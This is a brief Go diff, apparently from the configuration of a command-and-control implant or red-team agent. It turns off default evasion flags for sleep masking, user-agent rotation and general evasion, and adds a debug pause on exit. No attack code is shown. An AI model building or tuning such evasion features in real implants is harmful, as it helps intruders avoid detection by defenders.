@@ -26,9 +26,9 @@ var (
 	defaultWorkingHoursEnd   = "0"     // 24h, e.g. 18
 
 	// Evasion flags
-	defaultEnableEvasion     = "true"
-	defaultSleepMasking      = "true"
-	defaultUserAgentRotation = "true"
+	defaultEnableEvasion     = "false"
+	defaultSleepMasking      = "false"
+	defaultUserAgentRotation = "false"
 
 	// Debug mode — keeps console open on exit (Windows)
 	debugMode = "false"
@@ -81,6 +81,7 @@ func main() {
 		pauseIfDebug()
 		os.Exit(1)
 	}
+	pauseIfDebug()
 }
 
 // pauseIfDebug waits for Enter before exiting when debugMode == "true"
